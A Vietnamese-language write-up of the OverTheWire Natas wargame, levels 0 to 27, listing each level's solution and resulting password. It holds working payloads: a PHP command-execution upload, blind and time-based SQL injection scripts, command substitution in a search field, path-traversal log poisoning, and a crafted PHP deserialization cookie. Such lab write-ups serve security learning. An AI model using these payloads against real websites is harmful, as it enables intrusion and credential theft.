# NATAS WRITE UP
## Natas0
View source  
**user: natas1**  
**pass: gtVrDuiDfck831PqWsLEZy5gyDz1clto**
## Natas1
Ctrl + U  
**user: natas2**  
**pass: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi**
## Natas2
http://natas2.natas.labs.overthewire.org/files/users.txt  
**user: natas3**  
**pass: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14**
## Natas3
http://natas3.natas.labs.overthewire.org/robots.txt  
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt  
**user: natas4**  
**pass: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ**
## Natas4
Dùng Burp intercept request để sửa referer thành http://natas5.natas.labs.overthewire.org/  
**user: natas5**  
**pass: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**
## Natas5
Dùng Burp intercept request để sửa cookie thành loggedin=1  
**user: natas6**  
**pass: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1**  
## Natas6
http://natas6.natas.labs.overthewire.org/includes/secret.inc  
Secret: FOEIUWGHFEEUHOFUOIU  
**user: natas7**  
**pass: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**  
## Natas7
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8  
**user: natas8**  
**pass: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**  
## Natas8
```python
#!/bin/python3
  secret = base64.b64decode(bytes.fromhex('3d3d516343746d4d6d6c315669563362').decode('utf-8')[::-1])
```
secret = oubWYf2kBq  
**user: natas9**  
**pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl**  
## Natas9
Query: `'' -m10  /etc/natas_webpass/natas10`  
**user: natas10**  
**pass: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**
## Natas10
Query: `'' -m10  /etc/natas_webpass/natas11`  
**user: natas11**  
**pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK**
## Natas11
https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Base64','string':'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%253D'%7D,'Standard',false)&input=eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0  
Xor key: qw8J
Crafted cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
**user: natas12**  
**pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**
## Natas12
Tạo file php có nội dụng
```php
<?php 
    echo exec("cat /etc/natas_webpass/natas13");
?>
```
Upload file, sau đó dùng burp suite để sửa file extension thành ${random}.php (file đính kèm trong /Natas12/exploit.php)
**user: natas13**
**pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**
## Natas13
Thêm 4 bytes `FF D8 FF DB` vào trước file được tạo ở natas12
Upload file, sau đó dùng burp suite để sửa file extension thành ${random}.php (file đính kèm trong /Natas13/exploit.php)  
**user: natas14**  
**pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1**
## Natas14
`SELECT * from users where username="1" or "1"="1" and password="1" or "1"="1"`  
**user: natas15**  
**pass: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J**
## Natas15
Blind SQL  
```python
data = {"username": "natas16\" and password like binary \""+password+c+"%"}
res = requests.post(url, headers = headers, data = data)
if "This user exists" in res.text:
    password = password + c
```
Script exploit ở /Natas15/exploit.py  
**user: natas16**  
**pass: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh**
## Natas16
Command substitution và blind
```python
data = {"needle": "Africans$(grep ^"+password+c+" /etc/natas_webpass/natas17)", "submit": "Search"}
res = requests.get(url, headers = headers, params = data)
if "Africans" not in res.text:
    password = password + c
    break
```
**user: natas17**  
**pass: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw**
## Natas17
Time based blind
```python
data = {"username": "natas18\" and password like binary \""+password+c+"%\" and sleep(5) # "}
res = requests.post(url, headers = headers, data = data)
if (res.elapsed.total_seconds() > 5):
    password = password + c
    break
```
**user: natas18**  
**pass: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP**
## Natas18
Ta thấy không thể sửa biến `SESSION['admin'] = 1` được do hàm `isValidAdminLogin` đã bị comment. Ta cũng thấy `$maxid = 640`, đồng thời ta kiểm soát được biến `COOKIE['PHPSESSID']`.
```python
cookies = {"PHPSESSID": str(i)}
res = requests.get(url, headers = headers, cookies = cookies)
if "Password:" in res.text:
    print(res.text)
    break
```
**user: natas19**  
**pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs**
## Natas19
Thử một vài trường hợp, ta được quy luật `COOKIE['PHPSESSID'] = (${number}-${name}).encode(utf-8).hex()`
Ta thấy có name nên cho `name = admin`
```python
cookies = {"PHPSESSID": (str(i)+"-admin").encode("utf-8").hex()}
res = requests.get(url, headers = headers, cookies = cookies)
if "Password:" in res.text:
    print(res.text)
    break
```
**user: natas20**  
**pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF**
## Natas20
`name=hello+%0Aadmin+1`  
**user: natas21**  
**pass: IFekPyrQXftziDEsUr3x21sYuahypdgJ**
## Natas21
Gửi 2 request, lần lượt  
Request1: `align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update`  
Request2: `Cookie: PHPSESSID=${PHPSESSID từ request1};`  
**user: natas22**  
**pass: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ**
## Natas22
Sau khi header không `die` nên ta đọc được thông tin phía dưới  
**user: natas23**  
**pass: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE**

## Natas23
Type jungling  
`/index.php?passwd=3000iloveyou`  
**user: natas24**
**pass: OsRmXFguozKpTZZ5X14zNO43379LZveg**
## Natas24
`passwd[]=1`  
**user: natas25**  
**pass: GHF6X7YwACaYYssHVY05cFq83hRktl4c**
## Natas25
Ta thấy hàm `safeinclude` kiểm tra nếu `$filename` có chứa `../` thì sẽ thay thế bằng rỗng, ta thấy nếu `$filename="....//"` thì sẽ khi thay thế sẽ được `../`. Tuy nhiên ta không thể đọc file `/etc/natas_webpass/natas26` được do đã bị kiểm tra chuỗi có chứa `natas_webpass`. Trong hàm `logRequest` ta tháy khi ghi vào file log sẽ ghi thêm thông tin của `User-Agent`.  
`?lang=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_${PHP_SESSION}.log`  
`User-Agent: <?php echo file_get_contents("/etc/natas_webpass/natas26");?>`  
**user: natas26**  
**pass: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T**
## Natas26
Insecure deserialize  
Khi hàm `deserialize` trong PHP được gọi thì lần lượt hàm `_wakeup` và `_destruct` được gọi. Ta lợi dùng hàm `_destruct` của class `Logger`.
```php
<?php
class Logger{
    private $logFile = "img/natas26_emon.php";
    private $exitMsg = '<?php echo file_get_contents("/etc/natas_webpass/natas27");?>';
}
$obj = new Logger();
echo base64_encode(serialize($obj));
?>
``` 
Ta được `Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoiaW1nL25hdGFzMjZfZW1vbi5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTs/PiI7fQ==`  
Sửa `Cookie`: `drawing=Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyMDoiaW1nL25hdGFzMjZfZW1vbi5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjciKTs%2FPiI7fQ%3D%3D
`  
Ta vào http://natas26.natas.labs.overthewire.org/img/natas26_emon.php  
**user: natas27**  
**pass: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ**
## Natas27
Gửi 2 request  
Request 1: `username=natas28+++++++++++++++++++++++++++++++++++++++++++++++++++++++++emon&password=123456` để tạo user `natas28` fake của ta  
Request 2: `username=natas28&password=123456`  
**user: natas28**
**pass: JWwR438wkgTsNKBbcJoowyysdM82YjeF**